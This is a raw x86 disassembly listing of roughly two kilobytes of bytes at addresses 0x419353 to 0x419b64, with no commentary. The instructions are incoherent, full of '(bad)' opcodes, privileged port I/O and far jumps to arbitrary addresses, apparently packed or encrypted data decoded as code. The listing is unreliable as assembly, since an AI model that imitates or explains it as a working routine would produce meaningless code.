  419353:	add    BYTE PTR [eax+0x74],bh
  419356:	aad    0x7e
  419358:	in     al,dx
  419359:	retf   0x7f8c
  41935c:	cwde   
  41935d:	jecxz  0x419365
  41935f:	dec    esi
  419360:	or     ch,ch
  419362:	sbb    al,0xc3
  419364:	sbb    ecx,edx
  419366:	jnp    0x41937c
  419368:	lds    edx,FWORD PTR [ecx]
  41936a:	loope  0x419315
  41936c:	call   0xbc7dff34
  419371:	pop    ebx
  419372:	cmp    BYTE PTR [eax+eiz*4-0x2e9fea24],0x9
  41937a:	jmp    0x387b8d0c
  41937f:	jo     0x419304
  419381:	sar    DWORD PTR [edi+0x2e9000e0],cl
  419387:	ss loopne 0x41934b
  41938a:	sbb    al,0x1c
  41938c:	xor    BYTE PTR [eax],dl
  41938e:	iret   
  41938f:	mov    cl,0x9d
  419391:	mov    al,cl
  419393:	mov    eax,DWORD PTR [ebx]
  419395:	cmp    dl,ah
  419397:	je     0x4193ed
  419399:	cmp    bl,BYTE PTR [edi-0x6d]
  41939c:	mov    bh,0x33
  41939e:	shl    bh,1
  4193a0:	nop
  4193a1:	xchg   BYTE PTR [ebx+eiz*4],dh
  4193a4:	push   0xeaf5ca1a
  4193a9:	mov    al,0xb7
  4193ab:	and    edi,edx
  4193ad:	push   es
  4193ae:	loopne 0x4193dd
  4193b0:	mov    dl,BYTE PTR [edx]
  4193b2:	or     al,0xbd
  4193b4:	sub    bl,BYTE PTR [ecx+0x66]
  4193b7:	aam    0x7b
  4193b9:	repz cmp bl,BYTE PTR [ebp+0x6b]
  4193bd:	mov    es,WORD PTR [edx]
  4193bf:	sbb    esi,edx
  4193c1:	aad    0x11
  4193c3:	pusha  
  4193c4:	pop    esi
  4193c5:	add    BYTE PTR gs:[edx+ebp*1-0x51],bl
  4193ca:	retf   
  4193cb:	or     eax,eax
  4193cd:	sahf   
  4193ce:	jmp    0x4193ff
  4193d0:	int    0x95
  4193d2:	fild   QWORD PTR [ebp+0x68d7ba3]
  4193d8:	mov    eax,0xe4371c24
  4193dd:	test   BYTE PTR [esi+0x2e31ee4],0xf3
  4193e4:	or     dl,al
  4193e6:	ins    DWORD PTR es:[edi],dx
  4193e7:	adc    DWORD PTR [esi+0x72],esi
  4193ea:	jb     0x4193ad
  4193ec:	jle    0x41941d
  4193ee:	sti    
  4193ef:	test   eax,0xc4a89e16
  4193f4:	jecxz  0x4193c7
  4193f6:	fst    st(2)
  4193f8:	sahf   
  4193f9:	add    eax,0xb27f3c82
  4193fe:	cmp    edx,0xffffff8b
  419401:	mov    esi,0x3e62b62b
  419406:	cdq    
  419407:	fcom   DWORD PTR [ebx]
  419409:	loope  0x4193c3
  41940b:	push   esp
  41940c:	pop    esi
  41940d:	sar    esi,0x8c
  419410:	push   cs
  419411:	popa   
  419412:	mov    bh,BYTE PTR [ecx+0x6b]
  419415:	mov    bl,0x20
  419417:	int3   
  419418:	jmp    0x41cf72ed
  41941d:	dec    esi
  41941e:	aam    0xe3
  419420:	sub    BYTE PTR [edi+0x65075df3],bh
  419426:	inc    eax
  419427:	lock jg 0x419420
  41942a:	lods   eax,DWORD PTR ds:[esi]
  41942b:	pop    esi
  41942c:	ret    
  41942d:	imul   edi,DWORD PTR [ecx+0x596f0036],0x26
  419434:	adc    ecx,0xffffffe7
  419437:	std    
  419438:	repnz cld 
  41943a:	data16 jbe 0x419452
  41943d:	inc    edi
  41943e:	call   0x5ed4:0x73585583
  419445:	fs sahf 
  419447:	push   edi
  419448:	mov    ebx,0x63ed7fd3
  41944d:	pop    ecx
  41944e:	fdiv   DWORD PTR [eax+eiz*2+0x214777fb]
  419455:	pushf  
  419456:	xlat   BYTE PTR ds:[ebx]
  419457:	cmp    dl,cl
  419459:	sub    BYTE PTR [esi-0x32],0xf3
  41945d:	imul   edx,ebx,0x63ac2b98
  419463:	inc    esp
  419464:	mov    esp,0xb1060ee2
  419469:	out    0x21,al
  41946b:	mov    eax,0xd2bfd917
  419470:	fild   QWORD PTR [edi+0x5b]
  419473:	add    BYTE PTR [edi],ah
  419475:	cmp    bh,BYTE PTR [ecx+0xec3dc32]
  41947b:	(bad)  
  41947c:	frstor [ecx-0x1c5ce1e3]
  419482:	or     eax,0xa492dc12
  419487:	cmp    BYTE PTR [edi-0x24],bh
  41948a:	sub    eax,0xc3063a05
  41948f:	add    esi,edx
  419491:	cmp    DWORD PTR [ebp+0x12],edx
  419494:	daa    
  419495:	sbb    dh,BYTE PTR [edx-0x6a]
  419498:	test   BYTE PTR [eax-0xa],cl
  41949b:	mov    ecx,0x17083c3a
  4194a0:	or     al,0x15
  4194a2:	out    0x6c,al
  4194a4:	inc    eax
  4194a5:	ins    BYTE PTR es:[edi],dx
  4194a6:	ret    
  4194a7:	jmp    0xd4fa:0xd3a8c1f3
  4194ae:	aas    
  4194af:	clc    
  4194b0:	cdq    
  4194b1:	aas    
  4194b2:	scas   eax,DWORD PTR es:[edi]
  4194b3:	mov    esp,0x2d784b85
  4194b8:	pop    esp
  4194b9:	sbb    eax,DWORD PTR [eax-0x1680db49]
  4194bf:	or     edi,DWORD PTR [edi+0x33]
  4194c2:	arpl   WORD PTR [ebp-0x670550dd],ax
  4194c8:	jnp    0x419545
  4194ca:	push   ecx
  4194cb:	cwde   
  4194cc:	jne    0x4194cd
  4194ce:	cmp    DWORD PTR [eax-0x38339e66],eax
  4194d4:	pop    esi
  4194d5:	add    DWORD PTR [esi+0x7982f437],ebp
  4194db:	mov    ss,WORD PTR [edi+0x73]
  4194de:	xlat   BYTE PTR ds:[ebx]
  4194df:	jbe    0x41951c
  4194e1:	xchg   ecx,eax
  4194e2:	test   BYTE PTR [edi],ah
  4194e4:	xor    eax,0xcef27870
  4194e9:	jae    0x419488
  4194eb:	xlat   BYTE PTR ds:[ebx]
  4194ec:	cmp    edi,DWORD PTR [edx-0x5195ff1b]
  4194f2:	jle    0x41956f
  4194f4:	cmp    al,0x26
  4194f6:	js     0x41948c
  4194f8:	aam    0x63
  4194fa:	dec    eax
  4194fb:	fdivr  st(3),st
  4194fd:	icebp  
  4194fe:	test   ch,ah
  419500:	mov    ?,WORD PTR [eax-0x319c233]
  419506:	addr16 push edi
  419508:	stc    
  419509:	sbb    eax,0x1b985240
  41950e:	and    edi,esp
  419510:	repz jp 0x41952c
  419513:	test   DWORD PTR [esi],ecx
  419515:	shl    edi,0x4a
  419518:	mov    bl,0x93
  41951a:	xor    BYTE PTR [edi-0x7156c4be],ah
  419520:	mov    ebx,0xef9cc1e
  419525:	cwde   
  419526:	sbb    ecx,DWORD PTR [edi+0x59]
  419529:	cwde   
  41952a:	aaa    
  41952b:	inc    ebx
  41952c:	mov    DWORD PTR [esi+0x64],esi
  41952f:	loopne 0x41954e
  419531:	mov    ch,0xe6
  419533:	jle    0x41957c
  419535:	call   0x7d9f:0x950d31ba
  41953c:	mov    edx,DWORD PTR [edi-0x51a1840e]
  419542:	or     eax,0xf2905bc0
  419547:	loop   0x41953b
  419549:	jae    0x4194de
  41954b:	inc    eax
  41954c:	jl     0x41951f
  41954e:	icebp  
  41954f:	push   esi
  419550:	xor    BYTE PTR ds:0x9e49ff2f,0x9b
  419557:	ficom  DWORD PTR [ecx+0x78]
  41955a:	inc    edi
  41955b:	out    0x9e,eax
  41955d:	push   ds
  41955e:	add    ah,BYTE PTR [edx]
  419560:	mov    DWORD PTR [esi],esi
  419562:	add    ecx,edi
  419564:	add    esp,ebp
  419566:	in     al,dx
  419567:	out    0xb9,eax
  419569:	fwait
  41956a:	sbb    DWORD PTR [eax-0x7189e991],0x31e676e5
  419574:	push   edi
  419575:	data16 (bad) 
  419577:	cwde   
  419578:	mov    eax,0x71c7dbbf
  41957d:	fiadd  DWORD PTR [edi-0x61d295a3]
  419583:	div    DWORD PTR [ecx+0x580773f3]
  419589:	jae    0x41955a
  41958b:	xlat   BYTE PTR ds:[ebx]
  41958c:	icebp  
  41958d:	loop   0x41955d
  41958f:	jns    0x41960b
  419591:	add    BYTE PTR [edi+edx*1-0x34],0xb3
  419596:	sar    DWORD PTR ds:0x4f2ccdf7,0x14
  41959d:	(bad)
  4195a2:	add    di,WORD PTR [edx]
  4195a5:	(bad)  
  4195a7:	or     eax,0xa01c579f
  4195ac:	shl    DWORD PTR [ecx],cl
  4195ae:	or     bl,BYTE PTR [ecx]
  4195b0:	(bad)  
  4195b1:	pushf  
  4195b2:	push   esi
  4195b3:	lea    esi,[eax]
  4195b5:	sbb    DWORD PTR ds:0x18e8c31c,0x9
  4195bc:	pop    ecx
  4195bd:	add    al,0xbf
  4195bf:	add    BYTE PTR [edx+0x24],al
  4195c2:	call   0x3e9899e2
  4195c7:	(bad)  
  4195c8:	in     eax,dx
  4195c9:	pop    ebp
  4195ca:	shr    DWORD PTR [ebx+0x71],0xe4
  4195ce:	fiadd  DWORD PTR [eax]
  4195d0:	mov    esp,0x3d3f3905
  4195d5:	std    
  4195d6:	and    DWORD PTR [esi-0x641777c2],esi
  4195dc:	jns    0x419608
  4195de:	inc    ecx
  4195df:	mov    al,0xbd
  4195e1:	xchg   ebx,eax
  4195e2:	adc    ebp,edx
  4195e4:	cmp    bh,BYTE PTR [eax+0x1c1b5f00]
  4195ea:	cmp    DWORD PTR [ecx+0x65977832],0x58
  4195f1:	and    BYTE PTR [esi-0x29],0xf6
  4195f5:	dec    ebp
  4195f6:	xchg   DWORD PTR [edi-0x46f9de11],ebp
  4195fc:	mov    ds:0x95dc2cbb,eax
  419601:	loopne 0x4195e1
  419603:	push   ds
  419604:	jmp    FWORD PTR [ebx]
  419606:	push   ebp
  419607:	add    DWORD PTR [ebx],edi
  419609:	xor    eax,0xe771f270
  41960e:	out    dx,eax
  41960f:	out    dx,al
  419610:	cmp    al,0x7f
  419612:	(bad)  
  419613:	div    DWORD PTR [edi-0x38bfbe50]
  419619:	jmp    0x41964e
  41961b:	idiv   esi
  41961d:	pop    esi
  41961e:	jecxz  0x419601
  419620:	add    cl,BYTE PTR [edi+0x10652570]
  419626:	and    al,0xe6
  419628:	ret    
  419629:	inc    ecx
  41962a:	ins    BYTE PTR es:[edi],dx
  41962b:	jecxz  0x41960e
  41962d:	mov    dl,0x3
  41962f:	popf   
  419630:	inc    esi
  419631:	and    dh,ah
  419633:	out    0xea,eax
  419635:	sub    BYTE PTR [edi+eiz*8-0x3017331d],dh
  41963c:	int3   
  41963d:	xchg   ebp,eax
  41963e:	fstp   TBYTE PTR [ecx]
  419640:	push   edi
  419641:	inc    edi
  419642:	jmp    0xb0831d04
  419647:	fild   WORD PTR [edi+0x34]
  41964a:	popa   
  41964b:	mov    esp,0xaf4e9774
  419650:	ja     0x41968f
  419652:	and    al,0xe4
  419654:	sub    eax,0xf801b5ca
  419659:	ss in  eax,0xaf
  41965c:	cld    
  41965d:	int3   
  41965e:	pop    edi
  41965f:	push   edi
  419660:	aam    0x51
  419662:	not    DWORD PTR [ebx]
  419664:	repnz repnz dec ebx
  419667:	test   al,0x5b
  419669:	das    
  41966a:	and    cl,BYTE PTR [esi+0x67]
  41966d:	(bad)  
  41966e:	cmp    esp,DWORD PTR [eax]
  419670:	xchg   edi,eax
  419671:	xchg   ebx,eax
  419672:	mov    ds:0xaf3e817a,eax
  419677:	inc    ecx
  419678:	lock out 0xe4,al
  41967b:	xchg   ch,ch
  41967d:	jmp    0x83da373f
  419682:	jo     0x419647
  419684:	cmp    al,0x2d
  419686:	jo     0x4196cb
  419688:	jnp    0x4196c6
  41968a:	(bad)  
  41968b:	cmc    
  41968c:	sbb    BYTE PTR [edi+eax*4],dl
  41968f:	ja     0x419611
  419691:	xor    BYTE PTR [edi+0x13],ah
  419694:	pop    edx
  419695:	push   ss
  419696:	push   edi
  419697:	call   0x3829a55a
  41969c:	jg     0x41967e
  41969e:	sub    dh,BYTE PTR [esi]
  4196a0:	loopne 0x4196ca
  4196a2:	lods   al,BYTE PTR ds:[esi]
  4196a3:	xlat   BYTE PTR ds:[ebx]
  4196a4:	sbb    BYTE PTR [ecx+0x19],bh
  4196a7:	test   dh,cl
  4196a9:	mov    cl,0x5d
  4196ab:	int3   
  4196ac:	sar    cl,0xdf
  4196af:	stc    
  4196b0:	lods   al,BYTE PTR ds:[esi]
  4196b1:	sahf   
  4196b2:	outs   dx,BYTE PTR ds:[esi]
  4196b3:	inc    edx
  4196b4:	out    0x5c,eax
  4196b6:	mov    ebp,0x949ddf5e
  4196bb:	and    al,0x79
  4196bd:	enter  0x8250,0xfb
  4196c1:	jno    0x419683
  4196c3:	adc    edx,esi
  4196c5:	jnp    0x4196e2
  4196c7:	mov    eax,ds:0x94e6b2c
  4196cc:	jbe    0x4196ad
  4196ce:	push   esi
  4196cf:	add    al,0xd9
  4196d1:	adc    BYTE PTR [ecx+0x24],0xc0
  4196d5:	fs std 
  4196d7:	push   ebp
  4196d8:	adc    ah,BYTE PTR [ecx-0x1402240]
  4196de:	aas    
  4196df:	cld    
  4196e0:	cld    
  4196e1:	jmp    0x91c5:0xaf157eb7
  4196e8:	imul   eax,DWORD PTR [ebx],0xfffffff0
  4196eb:	ins    DWORD PTR es:[edi],dx
  4196ec:	mov    ch,BYTE PTR [eax]
  4196ee:	dec    ecx
  4196ef:	mov    bh,0x6
  4196f1:	cmp    esi,0xffffff8d
  4196f4:	mov    al,0x4f
  4196f6:	out    0xe2,al
  4196f8:	cdq    
  4196f9:	mov    edi,0xb224f908
  4196fe:	data16 mov bl,0xd3
  419701:	in     al,dx
  419702:	outs   dx,DWORD PTR ds:[esi]
  419703:	shl    DWORD PTR [ebp-0x46],cl
  419706:	mov    ecx,0xe8df99af
  41970b:	outs   dx,BYTE PTR ds:[esi]
  41970c:	adc    ecx,DWORD PTR [edi-0x52fdfe20]
  419712:	stc    
  419713:	arpl   si,bx
  419715:	rcr    DWORD PTR [edi],0xae
  419718:	and    bh,BYTE PTR [ebx]
  41971a:	sahf   
  41971b:	fmul   DWORD PTR [ecx]
  41971d:	iret   
  41971e:	rol    DWORD PTR ds:0xc1289cf0,0xe1
  419725:	adc    BYTE PTR [eax+0x4549d417],bh
  41972b:	cmp    al,0x69
  41972d:	mov    ah,BYTE PTR [ebx+0x74]
  419730:	data16 daa 
  419732:	xor    bh,BYTE PTR [edi+0x1e]
  419735:	int3   
  419736:	push   ebx
  419737:	add    DWORD PTR [edi],ebp
  419739:	and    eax,0xf00599d8
  41973e:	je     0x4197ab
  419740:	scas   eax,DWORD PTR es:[edi]
  419741:	xlat   BYTE PTR ds:[ebx]
  419742:	xor    BYTE PTR [eax+0x2836c12d],bh
  419748:	loope  0x419762
  41974a:	cmp    al,0xaf
  41974c:	js     0x419779
  41974e:	add    BYTE PTR [eax],cl
  419750:	repz (bad) 
  419752:	ror    BYTE PTR [esi+0x7a7277a7],0x51
  419759:	call   0x7ee2:0x32a77b7b
  419760:	xchg   DWORD PTR [esi],ebx
  419762:	dec    esi
  419763:	sub    BYTE PTR [edx+eax*4-0x20],0x13
  419768:	cmp    BYTE PTR [edx-0xd5bfc0f],bh
  41976e:	stos   DWORD PTR es:[edi],eax
  41976f:	clc    
  419770:	fs xor esi,ebx
  419773:	ins    BYTE PTR es:[edi],dx
  419774:	mov    ch,0xae
  419776:	aaa    
  419777:	or     BYTE PTR [edi+0x36b905],bh
  41977d:	fbld   TBYTE PTR [esi-0x30162d5c]
  419783:	push   0xa6d7e69a
  419788:	and    ebp,DWORD PTR [esi]
  41978a:	cmp    ah,BYTE PTR [esi]
  41978c:	xchg   edi,ebp
  41978e:	dec    DWORD PTR [ecx]
  419790:	and    ah,BYTE PTR [ebp+0x215b7e0c]
  419796:	popf   
  419797:	adc    DWORD PTR [esi+0x30],edx
  41979a:	idiv   DWORD PTR [esi+ecx*8+0x7c]
  41979e:	aas    
  41979f:	out    0x31,eax
  4197a1:	xchg   edi,eax
  4197a2:	fcmove st,st(2)
  4197a4:	jl     0x4197f4
  4197a6:	(bad)  
  4197a8:	sbb    BYTE PTR [ebx+eax*1+0x440339ec],0x1d
  4197b0:	adc    cl,BYTE PTR [edi-0x58401a5]
  4197b6:	stc    
  4197b7:	ret    0x7ffc
  4197ba:	xchg   edi,eax
  4197bb:	(bad)  
  4197bd:	jmp    0xecf48c08
  4197c2:	sub    al,0x13
  4197c4:	sub    al,0x1d
  4197c6:	xlat   BYTE PTR ds:[ebx]
  4197c7:	dec    eax
  4197c8:	js     0x419787
  4197ca:	xor    eax,0x701a3cc2
  4197cf:	call   0x20fa2692
  4197d4:	and    BYTE PTR [esi],bl
  4197d6:	cmp    al,0xc0
  4197d8:	sub    DWORD PTR [ebp-0x26],edx
  4197db:	out    dx,eax
  4197dc:	gs jmp 0xb001:0xece0ce36
  4197e4:	lea    ecx,[ecx+0x54e82cb7]
  4197ea:	dec    eax
  4197eb:	mov    esp,0x8ccec62d
  4197f0:	inc    ebx
  4197f1:	xlat   BYTE PTR ds:[ebx]
  4197f2:	fdiv   DWORD PTR [eax]
  4197f4:	pop    es
  4197f5:	add    ebp,ebx
  4197f7:	stc    
  4197f8:	add    dl,dl
  4197fa:	int3   
  4197fb:	repz sti 
  4197fd:	std    
  4197fe:	xor    bh,ch
  419800:	dec    edi
  419801:	cld    
  419802:	add    al,0xd1
  419804:	cmp    ebx,DWORD PTR [edi-0x7f79783f]
  41980a:	inc    eax
  41980b:	xor    BYTE PTR [eax],bl
  41980d:	cld    
  41980e:	fcomp  QWORD PTR [ebx-0x42]
  419811:	test   al,0xdf
  419813:	ret    
  419814:	jb     0x419883
  419816:	add    BYTE PTR [esi-0x12ca2eb3],bh
  41981c:	xor    edi,DWORD PTR [esi]
  41981e:	fld    DWORD PTR [edi-0x4d]
  419821:	fld    st(0)
  419823:	sbb    al,0xb5
  419825:	cmp    DWORD PTR ds:0xff7da845,ebx
  41982b:	pop    ss
  41982c:	rcl    BYTE PTR [edi+0x33a79056],1
  419832:	add    eax,0x4ebca870
  419837:	or     DWORD PTR [edi-0x1ffcaa40],0xffffff84
  41983e:	jmp    0x4197ce
  419840:	xor    bh,BYTE PTR [eax]
  419842:	inc    eax
  419843:	fwait
  419844:	xor    edx,0x3b
  419847:	stc    
  419848:	mov    ebx,0x73b40788
  41984d:	pop    esi
  41984e:	iret   
  41984f:	cmp    al,0xa7
  419851:	ja     0x419846
  419853:	jp     0x41989c
  419855:	sub    DWORD PTR [ebp+0x71],0x73
  419859:	jae    0x419832
  41985b:	popf   
  41985c:	xor    ah,BYTE PTR [edi-0x6]
  41985f:	or     DWORD PTR [ebx+0x63],esi
  419862:	loope  0x4197f1
  419864:	xor    BYTE PTR [edx+esi*2-0x70],bl
  419868:	imul   ebx,edi,0xc6ee2614
  41986e:	pusha  
  41986f:	out    dx,eax
  419870:	test   BYTE PTR [edi+0x47],bl
  419873:	xchg   ecx,eax
  419874:	mov    ebp,0xc4bd875b
  419879:	and    bh,dl
  41987b:	dec    eax
  41987c:	cdq    
  41987d:	jbe    0x419857
  41987f:	out    dx,eax
  419880:	pusha  
  419881:	and    ecx,DWORD PTR [esi-0x4c610d9f]
  419887:	jae    0x4198d3
  419889:	loop   0x4198c7
  41988b:	mov    ds:0x89dfce71,al
  419890:	adc    bl,BYTE PTR [ebx+eiz*2+0x5348169a]
  419897:	xor    BYTE PTR [ebx+0x21],al
  41989a:	mov    edx,0x9893ffdf
  41989f:	pop    ebx
  4198a0:	aas    
  4198a1:	rol    BYTE PTR [edx+0x32],0x4a
  4198a5:	mov    ds:0x4cb2c756,eax
  4198aa:	inc    esi
  4198ab:	ret    
  4198ac:	shr    DWORD PTR [ebx],1
  4198ae:	jg     0x41989f
  4198b0:	xchg   edi,eax
  4198b1:	call   DWORD PTR [edi-0x5343a41c]
  4198b7:	fbstp  TBYTE PTR [ebx-0x41ff928e]
  4198bd:	or     eax,0xf77fdbf9
  4198c2:	pop    ds
  4198c3:	sub    al,0xab
  4198c5:	call   0x1e24:0x993262f6
  4198cc:	dec    ebx
  4198cd:	nop
  4198ce:	into   
  4198cf:	out    0xd0,al
  4198d1:	jp     0x419948
  4198d3:	mov    edx,0x8fd39666
  4198d8:	inc    BYTE PTR [edx]
  4198da:	pop    ss
  4198db:	fwait
  4198dc:	pop    ds
  4198dd:	les    ebp,FWORD PTR [edi]
  4198df:	cmp    DWORD PTR [ecx],0xfb5678f6
  4198e5:	inc    esi
  4198e6:	(bad)  
  4198e7:	in     eax,dx
  4198e8:	sbb    ebx,esp
  4198ea:	or     DWORD PTR [edi+0x73881701],eax
  4198f0:	cmp    al,0xb4
  4198f2:	out    dx,al
  4198f3:	int3   
  4198f4:	div    DWORD PTR [ebx-0x78e77b1a]
  4198fa:	adc    al,0xe4
  4198fc:	dec    ebp
  4198fd:	add    esi,DWORD PTR [eax]
  4198ff:	jo     0x4198a8
  419901:	in     eax,0x82
  419903:	pop    es
  419904:	int3   
  419905:	mov    bl,0x3c
  419907:	dec    edx
  419908:	in     al,0xe4
  41990a:	hlt    
  41990b:	xor    BYTE PTR [edi-0x3d79241d],ch
  419911:	mov    ebp,DWORD PTR [ecx]
  419913:	cmp    BYTE PTR [edi+0x27b9e511],ch
  419919:	jbe    0x41995e
  41991b:	jp     0x419989
  41991d:	and    esp,DWORD PTR [ecx+0x1b]
  419920:	and    DWORD PTR [edi-0x8],ebp
  419923:	out    dx,eax
  419924:	aam    0xf8
  419926:	add    eax,0x9e790409
  41992b:	data16 js 0x4198bb
  41992e:	lea    esp,[ebx-0x54]
  419931:	pushf  
  419932:	out    dx,eax
  419933:	ret    0x6734
  419936:	out    0xed,eax
  419938:	xchg   esp,eax
  419939:	cmc    
  41993a:	add    al,0xc9
  41993c:	out    0xfa,al
  41993e:	jnp    0x41997e
  419940:	mov    edx,DWORD PTR [ebx-0x7e6cc7d6]
  419946:	add    eax,0x84132401
  41994b:	sub    DWORD PTR [eax-0x15],esi
  41994e:	add    eax,0x5f83fea
  419953:	push   ds
  419954:	dec    esi
  419955:	or     cl,BYTE PTR [eax]
  419957:	xchg   ebx,eax
  419958:	push   ds
  419959:	std    
  41995a:	jle    0x4198eb
  41995c:	data16 mov bl,0x41
  41995f:	mov    edi,0x993265d7
  419964:	xchg   esp,eax
  419965:	sbb    ecx,ebp
  419967:	out    0x4b,al
  419969:	out    dx,eax
  41996a:	fadd   st,st(5)
  41996c:	(bad)  
  41996d:	push   ds
  41996e:	adc    ecx,edi
  419970:	fnstsw WORD PTR [esi]
  419972:	xor    edi,0xf4924892
  419978:	push   0xffffffb7
  41997a:	ror    DWORD PTR [ebp-0x5c],cl
  41997d:	shr    BYTE PTR [ecx],cl
  41997f:	adc    al,0x45
  419981:	and    DWORD PTR [edx],ebx
  419983:	(bad)  
  419984:	shr    edi,1
  419986:	jne    0x4199d0
  419988:	inc    esp
  419989:	jl     0x4199ef
  41998b:	repz dec ebx
  41998d:	cmp    al,0x9e
  41998f:	cld    
  419990:	gs mov eax,0x8ed619f1
  419996:	(bad)  
  419997:	cmp    esp,ebp
  419999:	mov    ebp,0x365cf339
  41999e:	pop    ecx
  41999f:	ror    BYTE PTR ds:0x7f0e61d1,0xdb
  4199a6:	xchg   cl,al
  4199a8:	out    dx,eax
  4199a9:	leave  
  4199aa:	test   DWORD PTR [ebp-0x23f4cd9b],edi
  4199b0:	test   eax,0x75ed92c0
  4199b5:	add    eax,0x615e628f
  4199ba:	pop    ss
  4199bb:	fiadd  DWORD PTR [edi]
  4199bd:	mov    edi,0x5f5bb212
  4199c2:	popf   
  4199c3:	pop    DWORD PTR [ebx+0x7e7890c7]
  4199c9:	jmp    FWORD PTR [edx-0x42599fcf]
  4199cf:	sar    BYTE PTR [bx+di],0xa6
  4199d3:	cmp    al,0x8b
  4199d5:	outs   dx,BYTE PTR ds:[esi]
  4199d6:	sbb    al,0xc0
  4199d8:	push   eax
  4199d9:	nop
  4199da:	out    0x9f,eax
  4199dc:	lds    edi,FWORD PTR [ebx]
  4199de:	popa   
  4199df:	fdivr  st,st(1)
  4199e1:	mov    WORD PTR [esi+0x59a411e1],cs
  4199e7:	mov    edx,0x173b3161
  4199ec:	shl    DWORD PTR [edx+0x3dfb1ba3],cl
  4199f2:	or     eax,0xc24a392f
  4199f7:	fnstsw WORD PTR [edi+0x60]
  4199fa:	or     ah,BYTE PTR [eax]
  4199fc:	sbb    ah,al
  4199fe:	fwait
  4199ff:	inc    edx
  419a00:	daa    
  419a01:	sbb    BYTE PTR [edx-0x774c048e],ah
  419a07:	das    
  419a08:	(bad)  
  419a09:	daa    
  419a0a:	push   esp
  419a0b:	dec    esi
  419a0c:	stos   BYTE PTR es:[edi],al
  419a0d:	dec    esp
  419a0e:	ficom  DWORD PTR ds:0xcd00d1fa
  419a14:	adc    bx,WORD PTR [ecx-0x6a]
  419a18:	or     DWORD PTR [edi-0x5e],eax
  419a1b:	add    al,0x7a
  419a1d:	jge    0x419a6b
  419a1f:	test   bh,cl
  419a21:	add    BYTE PTR [edi-0x2ca31205],bh
  419a27:	out    dx,eax
  419a28:	jne    0x4199bb
  419a2a:	mov    esi,0xc5ae53f9
  419a2f:	xchg   ecx,eax
  419a30:	int    0x9b
  419a32:	mov    bh,0xff
  419a34:	call   0x9e3:0x26cfa9a6
  419a3b:	and    dl,BYTE PTR [ecx-0x6fdf7df8]
  419a41:	leave  
  419a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a43:	or     DWORD PTR [ebp+0x3f1404c2],eax
  419a49:	leave  
  419a4a:	dec    eax
  419a4b:	adc    BYTE PTR [ecx],bh
  419a4d:	jmp    FWORD PTR [ebx+eax*8]
  419a50:	aad    0xef
  419a52:	inc    ebx
  419a53:	dec    ebx
  419a54:	in     eax,0x9
  419a56:	sbb    ecx,DWORD PTR [ebp+0x7c]
  419a59:	mov    ebp,0x4e13a206
  419a5e:	jnp    0x4199e0
  419a60:	sub    eax,0xe09a5991
  419a65:	ins    BYTE PTR es:[edi],dx
  419a66:	ret    
  419a67:	jne    0x4199f0
  419a69:	mov    BYTE PTR gs:[ebx+0x62],dh
  419a6d:	mov    WORD PTR [ebx-0x71],ss
  419a70:	aaa    
  419a71:	dec    ebp
  419a72:	mov    ebx,0x595b103b
  419a77:	xor    eax,0xc2a7d530
  419a7c:	jg     0x419a59
  419a7e:	sbb    BYTE PTR [ebp+edx*8+0x64],bh
  419a82:	pop    ds
  419a83:	sti    
  419a84:	jg     0x419a6d
  419a86:	cmp    BYTE PTR [esi],cl
  419a88:	cs popa 
  419a8a:	cmp    DWORD PTR [esi-0x39],eax
  419a8d:	sti    
  419a8e:	add    DWORD PTR [ebp-0x110e3bec],ebx
  419a94:	dec    esi
  419a95:	call   0xd7e7c608
  419a9a:	mov    ebx,0x69d00e0b
  419a9f:	int    0x9f
  419aa1:	out    0x88,eax
  419aa3:	fld    TBYTE PTR [eax-0x3081871c]
  419aa9:	cmp    dh,BYTE PTR [edx]
  419aab:	mov    bh,0xeb
  419aad:	(bad)  
  419aae:	fyl2xp1 
  419ab0:	call   0xfdf4e603
  419ab5:	cwde   
  419ab6:	outs   dx,BYTE PTR ds:[esi]
  419ab7:	xor    BYTE PTR [ecx],0x5
  419aba:	push   ecx
  419abb:	pop    es
  419abc:	push   edx
  419abd:	sub    DWORD PTR [edx+0x1bcd3e77],ebx
  419ac3:	mov    edi,DWORD PTR [edi]
  419ac5:	dec    esp
  419ac6:	hlt    
  419ac7:	mov    ecx,0x50893cf
  419acc:	cmp    al,bl
  419ace:	jns    0x419b14
  419ad0:	xor    bl,BYTE PTR [ebp+0x70285f26]
  419ad6:	jl     0x419b50
  419ad8:	dec    eax
  419ad9:	cmp    bl,BYTE PTR [ebx+0x302f9f25]
  419adf:	push   ebp
  419ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ae1:	mov    WORD PTR [edi-0x5d],es
  419ae4:	call   0x901a9978
  419ae9:	std    
  419aea:	(bad)  
  419aec:	sti    
  419aed:	cmp    edi,edi
  419aef:	retf   0x6cb3
  419af2:	cld    
  419af3:	pop    edx
  419af4:	mov    esi,0x801b5c91
  419af9:	outs   dx,DWORD PTR ds:[esi]
  419afa:	push   ecx
  419afb:	jle    0x419ade
  419afd:	outs   dx,DWORD PTR ds:[esi]
  419afe:	dec    edi
  419b00:	mov    ecx,ecx
  419b02:	fs cli 
  419b04:	mov    edi,DWORD PTR [edx-0x2cd3d852]
  419b0a:	and    al,0x9b
  419b0c:	iret   
  419b0d:	jno    0x419b87
  419b0f:	js     0x419b51
  419b11:	cs lahf 
  419b13:	and    DWORD PTR [edi+0x787c702f],ebx
  419b19:	test   BYTE PTR [eax],ah
  419b1b:	rol    BYTE PTR [edx+0x36],0xc5
  419b1f:	stc    
  419b20:	stc    
  419b21:	and    eax,0xa1349307
  419b26:	push   edi
  419b27:	(bad)  
  419b28:	push   ebx
  419b29:	hlt    
  419b2a:	ret    0xd32a
  419b2d:	inc    BYTE PTR ds:0x4f89b511
  419b33:	popf   
  419b34:	sbb    eax,0x6d10f2cb
  419b39:	sbb    al,0xbd
  419b3b:	adc    DWORD PTR ds:0x7ca38051,edi
  419b41:	mov    dl,0x8d
  419b43:	mov    bh,BYTE PTR [ebx]
  419b45:	sub    DWORD PTR [edx-0x62c3b125],eax
  419b4b:	jns    0x419ba2
  419b4d:	scas   eax,DWORD PTR es:[edi]
  419b4e:	ja     0x419bc7
  419b50:	stos   DWORD PTR es:[edi],eax
  419b51:	or     DWORD PTR [esi],ebx
  419b53:	nop
  419b54:	into   
  419b55:	jge    0x419b33
  419b57:	jmp    0x419b4a
  419b59:	popf   
  419b5a:	lahf   
  419b5b:	cmp    eax,0xca77be88
  419b60:	scas   eax,DWORD PTR es:[edi]
  419b61:	add    edx,DWORD PTR [eax+0x3a]
  419b64:	outs   dx,BYTE PTR ds:[esi]
